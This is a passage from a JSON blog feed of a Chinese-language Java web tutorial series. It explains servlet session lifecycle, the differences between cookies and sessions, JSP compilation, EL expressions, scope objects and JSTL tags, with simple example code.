punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>启动测试，先访问<code>http://localhost:8080/demo1</code>,将数据存入Session然后访问<code>http://localhost:8080/demo2</code>,从Session中获取数据，查看控制台</p>\n<figure><figcaption>image-20240813150131452</figcaption></figure>\n<p><strong>session的生命周期</strong></p>\n<ul>\n<li>demo1在第一次获取session对象的时候，session对象会有一个唯一的标识</li>\n<li>demo1在session中存入其他数据并处理完成所有业务后，需要通过Tomcat服务器响应结果给浏览器</li>\n<li>Tomcat服务器发现业务处理中使用了session对象，就会把session的唯一标识当做一个cookie，添加<code>Set-Cookie:JESSIONID</code>到响应头中，并响应给浏览器</li>\n<li>浏览器接收到响应结果后，会把响应头中的coookie数据存储到浏览器的内存中</li>\n<li>浏览器在同一会话中访问demo2的时候，会把cookie中的数据添加到请求头中并发送给服务器Tomcat</li>\n<li>demo2获取到请求后，从请求头中就读取cookie中的JSESSIONID值，然后就会到服务器内存中寻找他对应的的session对象，如果找到了，就直接返回该对象，如果没有则新创建一个session对象</li>\n<li>关闭打开浏览器后，因为浏览器的cookie已被销毁，所以就没有JESSIONID的数据，服务端获取到的session就是一个全新的session对象</li>\n</ul>\n<figure><figcaption>image-20240813150330268</figcaption></figure>\n<p>在服务器正常关闭后Tomcat会自动将Session数据写入硬盘的文件中，这被称为钝化；再次启动服务器后，从文件中加载数据到Session中，数据加载到Session中后原本存储session的文件会被删除掉</p>\n<p><strong>Session销毁</strong></p>\n<p>session的销毁会有两种方式:</p>\n<ul>\n<li>默认情况下，无操作，30分钟自动销毁,对于这个失效时间，是可以通过配置进行修改的，在项目的web.xml中配置：</li>\n</ul>\n<figure><figcaption>image-20240813150626880</figcaption></figure>\n<ul>\n<li>\n<p>调用Session对象的invalidate()进行销毁：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code> session<span class=\"token punctuation\">.</span><span class=\"token function\">invalidate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div></li>\n</ul>\n<h2>4. Cookie和Session的区别</h2>\n<p>存储位置：Cookie 是将数据存储在客户端，Session 将数据存储在服务端</p>\n<p>安全性：Cookie不安全，Session安全</p>\n<p>数据大小：Cookie最大3KB，Session无大小限制</p>\n<p>存储时间：Cookie可以通过<code>setMaxAge()</code>长期存储，Session默认30分钟</p>\n<p>服务器性能：Cookie不占服务器资源，Session占用服务器资源</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "7-JSP",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/7-JSP.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/2-JavaWeb/7-JSP.html",
      "summary": "7-JSP\n1. JSP\nJSP（全称：Java Server Pages）：Java 服务端页面。是一种动态的网页技术，其中既可以定义 HTML、JS、CSS等静态内容，还可以定义 Java代码的动态内容，也就是 JSP = HTML + Java。如下就是jsp代码\nJSP 就是一个页面本质上就是一个 Servlet\nJSP访问流程\n\n浏览器第一次...",
      "content_html": "\n<h2>1. JSP</h2>\n<p>JSP（全称：Java Server Pages）：Java 服务端页面。是一种动态的网页技术，其中既可以定义 HTML、JS、CSS等静态内容，还可以定义 Java代码的动态内容，也就是 <code>JSP = HTML + Java</code>。如下就是jsp代码</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code> &lt;html&gt;\n     &lt;head&gt;\n         &lt;title&gt;Title&lt;/title&gt;\n     &lt;/head&gt;\n     &lt;body&gt;\n         &lt;h1&gt;JSP,Hello World&lt;/h1&gt;\n         &lt;%\n             System.out.println(\"hello,jsp~\");\n         %&gt;\n     &lt;/body&gt;\n &lt;/html&gt;\n</code></pre></div><p>JSP 就是一个页面本质上就是一个 Servlet</p>\n<h3><strong>JSP访问流程</strong></h3>\n<ul>\n<li>浏览器第一次访问 <code>hello.jsp</code> 页面</li>\n<li><code>tomcat</code> 会将 <code>hello.jsp</code> 转换为名为 <code>hello_jsp.java</code> 的一个 <code>Servlet</code></li>\n<li><code>tomcat</code> 再将转换的 <code>servlet</code> 编译成字节码文件 <code>hello_jsp.class</code></li>\n<li><code>tomcat</code> 会执行该字节码文件，向外提供服务</li>\n</ul>\n<p>此处用了smart tomcat运行的项目，我们可以找到<code>.SmartTomcat\\jsp\\jsp\\work\\Catalina\\localhost\\ROOT\\org\\apache\\jsp</code>目录，而这个目录下就能看到转换后的 <code>servlet</code>打开 <code>hello_jsp.java</code> 文件，可以看到有一个名为 <code>_jspService()</code> 的方法，该方法就是每次访问 <code>jsp</code> 时自动执行的方法，和 <code>servlet</code> 中的 <code>service</code> 方法一样 ，并且在 <code>_jspService()</code> 方法中可以看到往浏览器写标签的代码：</p>\n<p>以前我们自己写 <code>servlet</code> 时，这部分代码是由我们自己来写，现在有了 <code>jsp</code> 后，由tomcat完成这部分功能。</p>\n<p>在 <code>hello.jsp</code> 中书写</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code> &lt;%=\"hello\"%&gt;\n &lt;%=i%&gt;\n</code></pre></div><p>查看转换的 <code>hello_jsp.java</code> 文件，该脚本的内容被放在了 <code>out.print()</code> 中，作为参数</p>\n<figure><figcaption>image-20240813172037246</figcaption></figure>\n<p>在 <code>hello.jsp</code> 中书写</p>\n<div class=\"language-plaintext\" data-ext=\"plaintext\" data-title=\"plaintext\"><pre class=\"language-plaintext\"><code> &lt;%!\n     void  show(){}\n     String name = \"zhangsan\";\n %&gt;\n</code></pre></div><p>通过浏览器访问 <code>hello.jsp</code> 后，查看转换的 <code>hello_jsp.java</code> 文件，该脚本的内容被放在了成员位置</p>\n<figure><figcaption>image-20240813172146967</figcaption></figure>\n<h2>2. EL 表达式</h2>\n<p>EL（全称Expression Language ）表达式语言，用于简化 JSP 页面内的 Java 代码。EL 表达式的主要作用是 获取数据。其实就是从域对象中获取数据，然后将数据展示在页面上，如：<code>${brands} </code>就是获取域中存储的 key 为 brands 的数据。</p>\n<h3>代码演示</h3>\n<ul>\n<li>\n<p>定义servlet，在 servlet 中封装一些数据并存储到 request 域对象中并转发到 <code>el-demo.jsp</code> 页面。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@WebServlet</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/demo1\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ServletDemo1</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//1. 准备数据</span>\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token class-name\">Users</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Users</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"uName01\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"man\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Users</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"uName02\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"woman\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123456789\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Users</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"uName03\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"man\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//2. 存储到request域中</span>\n        request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Users\"</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Users</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//3. 转发</span>\n        request<span class=\"token punctuation\">.</span><span class=\"token function\">getRequestDispatcher</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/el-demo.jsp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forward</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div></li>\n<li>\n<p>在 <code>el-demo.jsp</code> 中通过 EL表达式 获取数据</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    ${Users}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></div></li>\n<li>\n<p>在浏览器的地址栏输入 <code>demo1</code>这个servlet ，页面效果如下：</p>\n<figure><figcaption>image-20240813172712144</figcaption></figure>\n</li>\n</ul>\n<h3>域对象</h3>\n<p>JavaWeb中有四大域对象，分别是：</p>\n<ul>\n<li>\n<p>page：</p>\n<p>有效范围pageContext：只在一个页面中保存属性，跳转后无效</p>\n<p>作用：代表jsp中</p>\n</li>\n<li>\n<p>request：</p>\n<p>作用：提供对请求数据的访问，提供用于加入特定请求数据访问</p>\n<p>有效范围：只在当前请求中保存，服务器跳转有效，客户端跳转无效</p>\n<p>主要用于处理用户的提交信息</p>\n</li>\n<li>\n<p>session：</p>\n<p>作用：用于保存客户端与服务端之间的数据</p>\n<p>有效范围：在一次会话中有效，无论何种跳转都有效。</p>\n</li>\n<li>\n<p>application：</p>\n<p>有效范围：整个项目，项目关闭、重启数据会丢失，如果项目不关闭，所有用户访问该项目的所有页面都可以获取application</p>\n</li>\n</ul>\n<h2>3. JSTL标签</h2>\n<p>JSP标准标签库(Jsp Standarded Tag Library) ，使用标签取代JSP页面上的Java代码。如下代码就是JSTL标签</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;c:if test=\"${flag == 1}\"&gt;\n    男\n&lt;/c:if&gt;\n&lt;c:if test=\"${flag == 2}\"&gt;\n    女\n&lt;/c:if&gt;\n</code></pre></div><p>上面代码看起来是不是比 JSP 中嵌套 Java 代码看起来舒服好了。而且前端工程师对标签是特别敏感的，他们看到这段代码是能看懂的。</p>\n<p>JSTL 提供了很多标签，如下图</p>\n<p>| 标签          | 描述                                                         |\n|</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    }
  ]
}